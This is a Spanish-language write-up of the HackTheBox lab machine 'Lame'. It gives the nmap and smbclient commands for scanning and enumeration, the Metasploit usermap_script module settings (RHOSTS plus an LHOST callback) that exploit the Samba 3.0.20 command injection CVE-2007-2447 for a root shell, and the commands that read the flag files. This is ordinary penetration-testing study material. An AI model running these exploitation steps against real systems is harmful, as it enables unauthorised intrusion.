---
title: "Lame — HackTheBox"
platform: HackTheBox
difficulty: Easy
tags: [linux, smb, metasploit]
date: 2024-03-15
description: Máquina Linux clásica. Explotación de Samba 3.0.20 vulnerable a ejecución remota de comandos.
---

## Información

| Campo       | Detalle          |
|-------------|------------------|
| OS          | Linux            |
| Dificultad  | Easy             |
| IP          | 10.10.10.3       |
| Plataforma  | HackTheBox       |

---

## Reconocimiento

Comenzamos con un escaneo Nmap para identificar puertos y servicios:

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.10.3
```

**Resultado relevante:**

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20
```

---

## Enumeración SMB

```bash
smbclient -L //10.10.10.3 -N
```

---

## Explotación

Samba 3.0.20 es vulnerable a **CVE-2007-2447** — inyección de comandos en el campo `username`.

```bash
searchsploit samba 3.0.20
```

Usamos Metasploit:

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.X
run
```

---

## Post-explotación

Obtenemos una shell como `root` directamente. Leemos las flags:

```bash
cat /root/root.txt
cat /home/makis/user.txt
```

---

## Conclusión

Máquina muy sencilla, ideal para iniciarse. El vector principal fue SMB con una versión extremadamente vulnerable. No se requirió escalada de privilegios.
